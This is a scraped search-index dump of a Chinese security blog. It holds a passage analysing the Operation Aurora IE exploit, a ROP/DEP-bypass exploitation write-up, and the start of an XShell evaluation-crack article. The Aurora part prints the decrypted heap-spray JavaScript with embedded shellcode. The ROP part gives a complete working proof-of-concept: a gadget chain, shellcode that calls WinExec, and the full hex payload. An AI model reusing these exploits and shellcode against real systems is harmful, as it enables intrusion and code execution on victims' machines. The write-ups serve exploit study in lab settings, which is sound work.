372302a6d592a6f3d44364b774322767b6153693f7c4164136313637c2a314f3973704966573355602328701f782b7c1175077f506e7469205e7b7e7a55254623526460396c08787d6d0569107f5672302a6d597b6f3d1669462743227129665d693f2e13364763136e762a364f397e29433657335460717f701f75727c16750722506e726920537b2c7d55254b7752646039615b78726d0536477f5672302a365e746f3d4436147f4322777b315c693f7c116245631331217e624f392c7d4963573300337174701f75727116750772076e7569205e742c7d5525467f00336039615375796d05644a74517230756d53756f3d43364b2443227c7d6c59693f2c46644a631331217f334f397e7a4469573354602328701f752c714075072002647269205e7d797f55254b7f5f6460396c5d78796d05364775517230756d5e7d6f3d493240714322767b6c59693f7141644063136e7475634f397e7044675733006f2374701f2a2e7c48750772556e776920592a73795525462452646039615a787d6d056942200572307566592a6f3d496840714322777b610c693f7c4963456313637575674f397e794236573352357c7d701f2a727b16750772506e7c69205e7b7e7155254b705f6660396c5378736d056442725772307567592a6f3d42674b754322717f3352693f7c41694a6313317d756c4f397370496957335260712d701f78737c407507725e6e7769205e297e7e55254b77003460393352787b6d05644a7f507230756d5e296f3d426714224322712a6c58693f71466941631363762a6d4f39732e16655733006f7c7f701f2a2e2c4675072250637c69205e2d7e7e5525467f5f666039330e75726d0564452250723075375e7f6f3d16684b754322712e3353693f7c15644b6313632478634f397e7b446857330062717c701f787971487507750063276920537c7e7e55254624556060396158787b6d0563457f5f7230756c5e2a6f3d44314b714322232f6c5a693f7c1163146313637c75374f39797f496357335231767b701f782b711275077400637c69205e7c7e7b55254b2052656039610b2a726d056245725672302a3153756f3d166514224322767b615d693f7c4069406313647278624f39737b146657335f6f717a701f757c714975077500652369205e7b2c70552514255f6660396c5d75286d053647205e723028635e7b6f3d4463147f4322717f615d693f7c11634563133126786d4f397378423657335f352328701f78737c4275077451317c6920587b73795525467e5f316039615975726d0564417f5672307564537f6f3d49694171432223796c58693f7c49644063136e7378374f397379496357335f65772a701f75787c1275077551637d6920582a732a5525417154316039615b78286d056945725772302a36","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:3:2","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"4. 验证样本 从上面的样本可以看到，有一大堆的乱七八糟的JavaScript代码，如果懂JavaScript的话可以直接对代码进行分析。我这里不太懂JavaScript，所以我是直接搭建的环境，然后用IE6.0进行测试。 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"4.1 环境搭建 搭建一个Web服务器，将恶意网页放在index.html中，模拟攻击者 环境搭建\" 环境搭建 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:1","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"4.2 模拟受害者 模拟受害者，使用IE6.0访问恶意网页 访问恶意网页\" 访问恶意网页 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:2","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"4.3 代码简单分析 使用IE6.0访问了恶意网页之后，并没有任何反应，从直觉上我感觉没有触发漏洞，应该是哪里搞错了。简单分析了下这个JavaScript代码，如下： 代码分析\" 代码分析 从上面分析中可以得知，这个恶意脚本获取了访问URL的参数，所以可能加上参数才能触发漏洞 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:3","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"4.4 寻找参数 在刚才的追踪流中寻找参数 寻找参数\" 寻找参数 可以看到在访问恶意网页的时候的确有参数：rFfWELUjLJHpP ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:4","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"4.5 触发漏洞 重新加上参数访问恶意网页 触发漏洞\" 触发漏洞 可以看到，在加上参数后访问提取出来的页面，IE崩溃了，说明此样本是可以触发漏洞的 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:5","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"5. 解密样本 从上面的操作来看，很明显提取的网页是一个加密Payload，而URL后的参数则是解密的密钥，接下来就需要用参数将加密Payload给解密出来。 如何解密样本呢？我的思路是在代码解密后、代码执行前，将解密出来的内容保存成文件。其实也不用这么麻烦，直接输出解密后的内容也是可以的，不过当时没有这么做。对恶意页面进行修改后，如下： 修改页面\" 修改页面 修改了之后再带上参数进行访问即可得到解密后的内容 得到解密样本\" 得到解密样本 解密后的Payload如下： 解密后的Payload\" 解密后的Payload 将其进行美化，就得到解密后的JavaScript代码： var VwUaVFlsiaztYmICdYI = \"COMMENT\"; var MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul = new Array(); for (i = 0; i \u003c 1300; i++) { MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul[i] = document.createElement(VwUaVFlsiaztYmICdYI); MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul[i].data = \"XPu\"; } var lTneQKOeMgwvXaqCPyQAaDDYAkd = null; var JsgdlqtHVnnWiFMCpdxJheQbdjITPhdkurJqwIMuMxJnHf = new Array(); var uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu = unescape; function gGyfqFvCYPRmXbnUWzBrulnwZVAJpUifKDiAZEKOqNHrfziGDtUOBqjYCtATBhClJkXjezUcmxBlfEX() { var mWgWGhyqOVxBPqtnAFWAyxhLnqBNaRNnkKvTfAwVuvOyCnGUwBPZEzSZtKpqGZUvPO = uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu('%uf841%u9327%u972f%u994a%u4a9b%uf943%u4e4b%u9290%uf84b%u3792%u3f99%uf599%u4891%u9b3f%u494f%u4e37%u3746%ud642%u484e%uf83f%u4f91%u3749%u414a%u49fd%u9896%u37fd%u4a4a%u9691%u4742%u4e43%u9b47%u9b90%uf837%uf94a%u4e37%ufcf5%u93fc%u4a3f%u2743%u984f%ud697%u97f5%u9143%u4148%uf590%ufc48%u4ff9%u27d6%u4a27%ufd27%uf593%ufd48%u989f%u4a90%u48f5%u49fd%u4993%u4827%u9899%u3f9b%u9193%ud648%ufd3f%u4249%u27fd%u9f90%ufd37%u4137%u9993%u9743%uf537%u9841%u9b27%u3793%u9142%u9196%u4847%uf8f8%ufd48%u4392%u3f91%u4b43%u4047%u90fc%u933f%u9827%u274f%u4937%u4092%u412f%u4b91%uf83f%u4699%u4749%u9691%u9949%u4041%u923f%u2793%u43f8%u4198%uf899%u9899%u474a%u4940%u4892%u4e46%u91fc%uf841%u4896%u984e%u27fd%u4f92%u9693%u43f8%u9ff5%uf893%ufdd6%ud649%u4a46%u4991%ufd98%u47d6%u9b43%uf893%u4bf9%u4e49%u4a46%u4348%uf540%u4398%u3f4b%u9046%u4b37%u4241%u3799%u994f%u4a97%ufc90%u4a3f%u499b%u3793%u4f37%u4a9b%u2f49%u4043%u9f42%u4af8%u2740%ufd99%uf5fd%u3747%u4092%u3747%u93d6%u9846%u9699%u3f2f%u47f8%ufc91%u979b%uf5f8%ud647%u43f9%u4347%u4a37%ufc48%u902f%u9bfd%u4942%u27f9%u2791%u489f%u4398%u4390%u9193%u9937%uf592%u4942%u964b%u9193%u922f%u924b%u3748%u2f9b%u372f%u414b%u9741%ufcf9%u49f9%ud6f5%u91fc%u4643%u41fd%uf893%u3727%u4b93%u2f27%u909f%u4847%u49fd%u972f%ufd41%u479b%u3742%u48f8%u9146%u43d6%u9b27%u41fd%u9348%u2742%u3796%uf8f9%ufd49%u3f90%u9690%u9096%uf5fd%u2f99%u98fd%ufdfd%u432f%u96d6%u9342%ufc42%u4a98%u4e42%u9243%u4727%u939b%u47fd%u4193%u4a3f%u3f91%u929b%u9149%uf9f8%uf59b%u4849%u409b%u9796%u4b4f%u9797%uf548%u9041%u4948%u9141%u2743%u46f5%u3799%uf549%u9292%uf592%u4392%u9049%uf949%u4092%u4090%u3ff9%u4afd%u2f49%u4243%u4697%u9697%u9747%u434e%u92f8%u4741%u37f8%u9b2f%u46d6%u3791%ufd97%u489f%ud693%u2f96%u3797%u41fc%uf892%ufc93%ud699%u4792%u419b%u3f4b%u4f90%u9bfd%u493f%ufdf5%uf541%u439f%uf9f5%u909b%u4b99%u9093%ufd91%u2746%u989f%u4942%u97f8%u4897%u473f%u9337%ufc3f%uf9fd%u4e2f%u42f8%uf92f%u9690%u9096%u49d6%u9f9f%u9098%u9040%uf991%u4b27%u9f91%u4a48%u48f8%u3f43%u9937%u41d6%u994a%u424b%u4b96%u9146%u48f8%uf893%u472f%u982f%u4991%u4241%u9b42%u469b%u423f%u4f4e%u9792%u9296%ubf98%ua70b%u4afb%ud8db%uc929%u74d9%uf424%u4bb1%u315a%u127a%uea83%u03fc%ua971%ubf19%u7104%ub289%u85f9%udbce%u7a8c%u1c2f%uf3ee%u2dca%u673c%u1c9e%ue3f0%uacf2%ua17b%u27e6%u6e09%u8f08%u48a7%u1027%u5506%ud2eb%u2909%u06f6%u10e9%u5b39%u55e8%u9424%u0eb8%u0722%u3a2c%u9476%uec4d%ua4fc%u8935%u51c3%u908f%uc913%udb84%u618b%ufbc2%ua6aa%uc711%uc3e5%ub3e1%u05f7%u3b38%u69c6%u0296%u67e6%u43e7%u97c1%ubf92%u2531%u7ba4%uf14b%u9e21%u72eb%u7a91%u560d%u0847%u1301%u560c%ua206%uecc1%u2f32%u22e4%u6bb3%ue6c2%u289f%ube6b%u9e45%ua094%u7f22%uaa30%u94c1%uf142%u598d%u0a78%uf64e%u790b%u597c%u15a7%u12cc%ue161%u0933%u7dd5%ub2ca%u5725%ue609%ucf75%u87b8%u0f1e%u5244%u5fb0%u0dea%u3070%ufe4a%u5a18%u2145%u6538%u4a8f%u9fd2%ub558%uc48a%u5d52%u04c8%u7f73%ue245%u6f19%ubc03%u16b5%u360e%ud627%u3285%u5c67%uc229%u9526%ud044%u55df%u8a13%u6976%ua18e%uff76%u6034%u9720%u5536%u3806%ub0c9%uf11c%u7b5f%ufe4b%u7b8f%u","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:5:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"6. END 这次流量分析+样本提取，我算是知道了如何去捕获别人的攻击、以及根据别人的攻击流量提取出最关键的exp，感觉在这种流量捕获+分析中，任何加密的exp都能被捕获到，然后自己再分析并利用，看来exp也不能随便用，你也不知道对面是否开了流量监控等着你去攻击。 参考链接 exabeam 极光行动介绍：https://www.exabeam.com/information-security/operation-aurora/ js 把字符串保存为txt文件，并下载到本地：https://www.cnblogs.com/hill-foryou/p/js.html js美化：https://tool.lu/js/ 流量包下载：https://meta.box.lenovo.com/link/view/d3040d279acd4d789d9efb84d94ef6cf 密码：1f84 参考书籍 《Wireshark数据包分析实战 第3版》 [美]克里斯·桑德斯（Chris Sanders）著，诸葛建伟、陆宇翔、曾皓辰 译，人民邮电出版社，ISBN: 9787115494313，豆瓣链接 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:6:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"ROP初体验","date":"2019-06-02","objectID":"/2019/06/first-rop/","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"1. ROP 介绍 介绍ROP之前，也先介绍下DEP 引用 数据执行保护 (DEP) 是一套软硬件技术，能够在内存上执行额外检查以防止在不可运行的内存区域上执行代码，在这样的内存空间中，即使出现了溢出情况，堆栈也是不可执行的。 ROP，Retrun-oriented Programmming(面向返回的编程)，是一种可绕过DEP的方法。技术原理就是通过构造特定的溢出内容，使程序通过RET指令跳转到构造的内容去执行相应的指令，而构造的内容则是程序自身模块中的代码段的地址，这样程序去执行时则不会触发DEP。一般构造的ROP链是构造VirtualProtect函数去把栈空间修改为可读可写可执行，然后再跳转到栈空间去执行ShellCode。 ROP的原理大概懂了，但一直没有机会进行实践，某一天，@老刘发来一个程序，说程序存在溢出漏洞，叫找到溢出点并利用，于是开整！ 实验环境：Windows7 32位 实验环境\" 实验环境 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:1:0","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"2. 寻找程序溢出点，尝试利用 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:2:0","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"2.1 程序分析 首先分析程序，看看程序做了什么。从下面可以看到，该程序就是简单的读取文件内容并输出，很简单的一个小程序。在这种程序中，存在很明显的栈溢出。首先读取文件时先获取了文件大小，然后根据大小读取了文件内容并存放在栈空间，但栈空间空间不够大，只要构造足够大的文件，这个程序必然会崩溃，发生溢出。 分析程序\" 分析程序 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:2:1","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"2.2 构造文件，使其溢出 构造的文件如下： 构造的文件\" 构造的文件 运行程序，可以看到程序的确产生了溢出 程序溢出\" 程序溢出 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:2:2","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"2.3 寻找 JMP ESP，尝试利用 这里只是先尝试是否可利用，所以我这里在kernel32.dll中随便找了个JMP ESP的指令地址0x767CF7F7，然后构造文件并尝试利用 DEP保护\" DEP保护 可以看到执行栈中的数据时，程序报异常了，说明此程序开启了DEP，需要通过ROP绕过才行。 注意 OD需要关闭插件和选项中的异常跳过才能观察到异常产生 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:2:3","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"3.寻找未开启 ASLR 的模块 在构造ROP链之前，需要从程序的加载模块中找到未开启ASLR(随机基址)的模块，这样才能保证exp的通用性。 使用Mona查找未开启随机基址的模块 \u003e # windbg命令 \u003e .load pykd.pyd # 加载python \u003e !py mona # 执行mona，这里是为了下载符号 \u003e !py mona noaslr # 查找未开启aslr的模块 结果如下： 未开启ASLR的模块\" 未开启ASLR的模块 可以看到未开启随机基址的模块只有一个，那就是程序本身，那么接下来的ROP链只能在程序本模块找了 这里可以在Mona里尝试自动查找ROP链： \u003e # windbg命令 \u003e !py mona rop 结果如下： Mona查找ROP链\" Mona查找ROP链 可以看到通过Mona查找是找不到完整的ROP链的，还是得自己手动查找 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:3:0","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"4. 构造 ROP 链的思路 我这里的思路还是构造VirtualProtect，修改栈空间的内存属性，然后跳转到栈空间执行ShellCode。 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:4:0","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"4.1 寻找 VirtualProtect 的地址 首先需要找到能获取VirtualProtect地址的方法，因为VirtualProtect是kernel32.dll中的地址，而kernel32.dll又是开启随机基址的，所以VirtualProtect的地址肯定不能写成硬编码。 思路1：通过本程序的导入表获取VirtualProtect的地址，因为本程序的没有随机基址的，只要导入表中有VirtualProtect的地址，那么就将此IAT的地址写成硬编码就能获取VirtualProtect的地址，那么先找到程序的导入表看看： 程序导入表\" 程序导入表 天公不作美，可以看到导入表中并没有导入VirtualProtect，需要另想办法。 思路2：通过程序代码段中的mov xxx,fs:[0x30]这种指令，获取kernel32.dll的首地址，然后通过偏移获取VirtualProtect的地址： FS寄存器\" FS寄存器 这个就更没有了，整个程序中也就只有上图中两种对FS寄存器操作的指令，所以这条路也不行了。 思路3：经过 @梦轩老哥的提醒，找到这样一种方法： 首先获取导入表中kernel32.dll的其他API地址，求出VirtualProtect地址距离这个API地址的偏移 然后在程序中找到相加或相减的指令地址，将其构造成ROP链，这样就能获取到VirtualProtect的地址了 例如下图这样： 通过偏移获取地址\" 通过偏移获取地址 这个思路的确能很准确的获取到VirtualProtect的地址，但仅限于当前测试的系统版本上。因为其他版本的操作系统kernel32.dll中的函数地址偏移会发生改变，那么这种方式也就失效了。不过至少在这个版本的操作系统上，这种方式是通杀的，所以这里就采用这种方式获取VirtualProtect的地址。 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:4:1","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"4.2 VirtualProtect 的参数 执行VirtualProtect，需要传递参数。VirtualProtect的原型是这样的： BOOL VirtualProtect( LPVOID lpAddress, // 需要修改属性的内存地址 SIZE_T dwSize, // 修改的大小 DWORD flNewProtect, // 新属性 PDWORD lpflOldProtect // 存放旧属性的缓冲区 ); 在这里参数2和参数3可以确定，而参数1和参数4则需要填写栈的地址，如果程序开启了随机基址，则不能写成硬编码，需要动态获取。当然这里程序没有随机基址，那么这两个参数可以随意找一个栈地址，写成硬编码就行了。 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:4:2","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"4.3 JMP 指令 执行VirtualProtect之后，需要跳转到存放ShellCode的栈地址去执行，所以执行VirtualProtect代码的位置后面必须有JMP xxx或RET等这样的指令，这样才能跳转过去。而这个栈地址因为模块未开启随机基址的原因，所以可以测试之后将这个地址写成硬编码。 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:4:3","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"5. 尝试构造 ROP 链 这里采用上面的思路3构造ROP链，大概分为以下几步： 获取VirtualProtect地址 构造VirtualProtect参数 调用VirtualProtect 跳转到ShellCode地址并执行 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:0","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"5.1 相关问题分析 首先需要构造一个存放API地址的导入表地址，该API必须与VirtualProtect同处于一个模块，也就是kernel32模块。 我这里使用导入表中第一个API地址，从前面的图中可以看到，当前程序的导入表第一个API为kernel32.IsDebuggerPresent函数，那么需要构造的是存放这个函数的导入表地址，也就是0x402000，而不是函数的实际地址0x7675B02B。 信息 这里解释下为什么构造的是导入表的地址，而不是直接构造某个函数的实际地址。因为kernel32模块肯定是开启了随机基址的，每台机器的同一个函数的实际地址都不一致，如何获取到函数的实际地址，那就只能通过导入表来获取，这也是导入表存在的意义。要是能直接构造，那直接构造VirtualProtect的地址就完事了，何必还要费这么大功夫。 构造之前，需要考虑两个问题： 使用哪个寄存器？ 这里使用哪个寄存器都行，只要能精准控制寄存器就可以，但是必须要保证能通过这个寄存器取到所在内存的值才行。因为如果这里使用EAX，那么后面取API地址的时候必然会用到MOV xxx,[EAX]这样的指令，但可能程序中不存在这样的指令，所以就需要多次测试，找到可用的寄存器。 如何得到VirtualProtect的地址？ 这里使用偏移来得到VirtualProtect的地址，那么就得使用相加或相减的语句。当然如果刚好程序中有相关的语句最好，但是大部分都没有这么好的事。例如kernel32.IsDebuggerPresent函数距离VirtualProtect函数为0x50，但就是没有ADD EAX，0x50这样的语句存在，那么就需要改变思路，用多条语句相加减实现。 上面两个问题的举例语句： ; 寄存器取值 MOV ECX, [EAX + 8] MOV ECX, [EBP - 8] ; 多条语句相加减 ADD EAX，EDX ADD EAX, 0x10 SUB EAX, EDX SUB EAX, 0x10 INC EAX DEC EAX ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:1","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"5.2 获取 VirtualProtect 地址 给EAX赋值，需要与后面匹配 ROP值 说明 7F154000 溢出后跳转的第一个地址，给EAX赋值 F81F4000 给EAX赋的值 00000000 填充物 0040157F | 58 | pop eax ; EAX = 0x401FF8 00401580 | 5E | pop esi ; ESI = 0 00401581 | C3 | ret ; 跳到下一个构造好的ROP链 给EDI和ESI赋值，后面会用到 ROP值 说明 84164000 第二个RET地址，赋值偏移给ESI 00000000 给EDI赋值为0，后面会比较EDI 80A0FFFF 给ESI赋值，将ESI设置为一个负数偏移，后面通过加法获取到VirtualProtect的地址(这个偏移是计算得来的) 00401684 | 5F | pop edi ; EDI = 0 00401685 | 5E | pop esi ; ESI = 0xFFFFA080 00401686 | C3 | ret ; 跳到下一个构造好的ROP链 通过EAX获取导入表中函数的地址，因为没有MOV xxx,[EAX]这样的指令，这里使用的是mov ecx, dword ptr [eax + 8] ROP值 说明 9B134000 第三个RET地址，获取 VirtualProtect 地址 00000000 填充物 00000000 填充物 00000000 填充物 00000000 填充物 0040139B | 8B 48 08 | mov ecx,dword ptr ds:[eax+8] ; eax+8 = 0x402000, 获取到导入表中的函数地址 0040139E | 03 CE | add ecx,esi ; 将函数地址加上偏移得到VirtualProtect地址 004013A0 | 3B F9 | cmp edi,ecx 004013A2 | 72 0A | jb consoleapplication1.4013AE ; edi为0，所以直接跳转 004013A4 | 42 | inc edx 004013A5 | 83 C0 28 | add eax,28 004013A8 | 3B D3 | cmp edx,ebx 004013AA | 72 E8 | jb consoleapplication1.401394 004013AC | 33 C0 | xor eax,eax 004013AE | 5F | pop edi ; 从上方跳转至此 004013AF | 5E | pop esi 004013B0 | 5B | pop ebx 004013B1 | 5D | pop ebp 004013B2 | C3 | ret ; 跳到下一个构造好的ROP链 这里的ESI为偏移，而这个偏移需要根据选择的函数和系统的不同而改变的 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:2","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"5.3 转换 ECX 到 EAX 通过上面的方法，ECX已经为VirtualProtect的地址了，但这里没有CALL ECX这样的指令，所以还需要将ECX转换到其他寄存器上去。因为这里有CALL EAX，所以我这里选择的是MOV EAX, ECX ROP值 说明 59144000 第四个RET地址，将 VirtualProtect 地址赋值给EAX 00401459 | 8B C1 | mov eax,ecx ; eax = VirtualProtect 0040145B | C3 | ret ; 跳到下一个构造好的ROP链 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:3","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"5.3 处理后续 现在EAX已经是VirtualProtect的地址了，已经可以CALL EAX了。但这里寻找的CALL EAX指令执行后还执行了其他的指令，会影响RET的位置，所以需要将后续处理好 ROP值 说明 84164000 第五个RET地址，处理后续 00000000 给EDI赋值为0 00000000 给ESI赋值为0 00401684 | 5F | pop edi ; EDI = 0 00401685 | 5E | pop esi ; ESI = 0 00401686 | C3 | ret ; 跳到下一个构造好的ROP链 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:4","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"5.5 执行 VirtualProtect 开始执行VirtualProtect，需要传递参数，所以构造的内容还包括参数 ROP值 说明 7B164000 第六个RET地址，执行 VirtualProtect FCFF1200 VirtualProtect参数1：当前栈地址 01000000 VirtualProtect参数2：大小 40000000 VirtualProtect参数3：修改的属性 FCFF1200 VirtualProtect参数4：随意的栈地址 00000000 填充物 00000000 填充物 0040167B | FF D0 | call eax ; 执行VirtualProtect 0040167D | 83 C6 04 | add esi,4 ; esi = 4 00401680 | 3B F7 | cmp esi,edi ; 第三步做的工作就为了这里 00401682 | 72 F1 | jb consoleapplication1.401675 ; esi\u003eedi, 所以不会跳转 00401684 | 5F | pop edi 00401685 | 5E | pop esi 00401686 | C3 | ret ; 跳到下一个构造好的ROP链 这里需要说明一点的是，VirtualProtect的参数问题，参数1和参数4需要根据自己系统上的栈空间来构造 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:5","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"5.6 跳转到栈空间 执行了VirtualProtect之后，就需要跳转到栈空间去执行ShellCode了，构造了这个栈地址之后ROP链也就到这就结束了，其余的就是ShellCode了。而这个栈空间地址也需要根据自己构造的ROP链和系统来决定 ROP值 说明 A8FF1200 最后一个RET地址，执行ShellCode的地址 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:6","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"6. 最终的 Poc // 填充物 313233343132333431323334313233343132333431323334313233343132330090909090 // ROP链 7F154000 F81F4000 00000000 84164000 00000000 80A0FFFF 9B134000 00000000 00000000 00000000 00000000 59144000 84164000 00000000 00000000 7B164000 FCFF1200 01000000 40000000 FCFF1200 00000000 00000000 A8FF1200 // ShellCode A100204000 // mov eax,[0x402000] 获取导入表函数地址 056A360400 // add eax,4366A 通过偏移找到WinExec()函数，这个偏移需要根据系统而决定 EB14 // jmp 12FFC8 跳转到下方去执行，这里的偏移根据参数不同需要改变 636D642E657865202F632063616C632E65786500 // \"cmd.exe /c calc.exe\"字符串，WinExec()的参数 6A00 // push 0 WinExec()参数1 68B4FF1200 // push 12FFB4 WinExec()参数2，这里的参数地址需要根据参数改变 FFD0 // call eax 执行WinExec() // 完整的Poc 3132333431323334313233343132333431323334313233343132333431323300909090907F154000F81F400000000000841640000000000080A0FFFF9B13400000000000000000000000000000000000591440008416400000000000000000007B164000FCFF12000100000040000000FCFF12000000000000000000A8FF1200A100204000056A360400EB14636D642E657865202F632063616C632E657865006A0068B4FF1200FFD0 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:6:0","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"7. 执行效果 这个Poc在当前系统版本上是通杀的，无论重启还是怎么样，都能实现精准溢出并执行 执行效果\" 执行效果 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:7:0","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"8. END 这次实验，是把以前看过ROP资料给实际运用起来了，而且是手动寻找的ROP链，算是理论+实践结合了，收获很大。 这次实践中，还是遇到了老问题，思路不够开阔。获取VirtualProtect地址时，当没有导入表和FS寄存器的时候，我的确找不到其他办法突破了，要是没有 @梦轩老哥 的帮助，可能也构造不出版本通杀的Poc，非常感谢 @梦轩老哥 的帮助。 ","date":"2019-06-02","objectID":"/2019/06/first-rop/:8:0","tags":["溢出","ROP","权限绕过"],"title":"ROP的第一次实战","uri":"/2019/06/first-rop/"},{"categories":["二进制的奇妙之旅"],"content":"业界最强大的SSH客户机","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/","tags":["逆向","破解"],"title":"XShell 6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"},{"categories":["二进制的奇妙之旅"],"content":" 信息 本篇文章只做技术分享，不提供破解版本下载！ ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:0:0","tags":["逆向","破解"],"title":"XShell 6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"},{"categories":["二进制的奇妙之旅"],"content":"1. 引言 XShell作为一个强大的SSH连接工具，一直深受我喜爱。某天，我突然发现自己的XShell不能用了，就像下面这样： 到期窗口\" 到期窗口 XShell分为个人版和企业版，个人版是永久免费的，而企业版则需要购买。个人版与企业版的区别在于：个人版的窗口标签页被限制为4个，其余的与企业版差别不大。而我当时不知道有个人版，一直用的都是评估版，评估版是有期限的，只能用31天，于是就诞生了这篇文章。 ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:1:0","tags":["逆向","破解"],"title":"XShell 6评估版逆向分析","uri":"/2019/05/xshell-6-analysis/"},{"categories":["二进制的奇妙之旅"],"content":"2. 测试环境和工具 测试环境： Windows7 32位 使用工具： OllyDbg、火绒剑、010Editor、Resource Hacker、IDA Pro等等 ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:2:0","tags":["逆向","破解"],"title":"XShell 